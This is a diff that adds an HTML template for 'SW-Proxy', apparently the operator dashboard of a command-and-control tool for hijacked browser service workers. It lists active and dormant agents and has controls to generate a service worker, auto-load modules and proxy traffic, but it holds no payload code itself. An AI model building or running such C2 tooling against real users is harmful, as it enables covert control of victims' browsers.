@@ -1,0 +1,69 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="">
+    <meta name="author" content="">
+    <title>C2 - Service Workers</title>
+    <link href="{{ url_for('static', filename='bootstrap/css/bootstrap.min.css')}}" rel="stylesheet">
+    <link href="{{ url_for('static', filename='dashboard.css')}}" rel="stylesheet">
+  </head>
+  <body>
+    <nav class="navbar navbar-dark fixed-top bg-dark flex-md-nowrap p-0 shadow">
+      <a class="navbar-brand col-sm-3 col-md-2 mr-0" href="#">SW-Proxy</a>
+      <medium class="text-muted" id="proxy-status-bar">Status: Not Proxying</medium>
+      <ul class="navbar-nav px-3">
+        <li class="nav-item text-nowrap">
+          <a class="nav-link" href="#" id="clear-proxy">Clear Proxy</a>
+        </li>
+      </ul>
+    </nav>
+    <div class="container-fluid">
+      <div class="row">
+        <nav class="col-md-2 d-none d-md-block bg-light sidebar">
+          <div class="sidebar-sticky">
+            <h6 class="sidebar-heading d-flex justify-content-between align-items-center px-3 mt-4 mb-1 text-muted">
+              <span>Active Workers</span>
+              <a class="d-flex align-items-center text-muted" href="#">
+                <span data-feather="plus-circle"></span>
+              </a>
+            </h6>
+            <ul class="nav flex-column mb-2" id="agents-sidebar">
+            </ul>
+            <hr/>
+            <h6 class="sidebar-heading d-flex justify-content-between align-items-center px-3 mt-4 mb-1 text-muted">
+              <span>Dormant Workers</span>
+              <a class="d-flex align-items-center text-muted" href="#">
+                <span data-feather="plus-circle"></span>
+              </a>
+            </h6>
+            <hr/>
+            <ul class="nav flex-column mb-2" id="dormant-agents-sidebar">
+            </ul>
+          </div>
+        </nav>
+        <div class="col-md-10 ml-sm-auto col-lg-10 px-4">
+          <div class="row">
+            <div class="col-md-12 ml-sm-auto col-lg-12 px-4" id="agents-main">
+              <center class="main-center">Wait for agents to appear, then click them for details</center>
+            </div>
+          </div>
+          <div class="row">
+            <div class="col-sm" id="auto-load-modules">
+              <h4>Auto Load Modules On New Agents</h4>
+            </div>
+            <div class="col-sm">
+              <a href="#" class="nav-link" id="generate-sw">Generate SW</a>
+              <textarea id="sw-result"></textarea>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <script src="{{ url_for('static', filename='jquery-3.3.1.slim.js')}}"></script>
+    <script src="{{ url_for('static', filename='popper.js')}}"></script>
+    <script src="{{ url_for('static', filename='bootstrap/js/bootstrap.min.js')}}"></script>
+    <script src="{{ url_for('static', filename='sw-dashboard.js')}}"></script>
+  </body>
+</html>
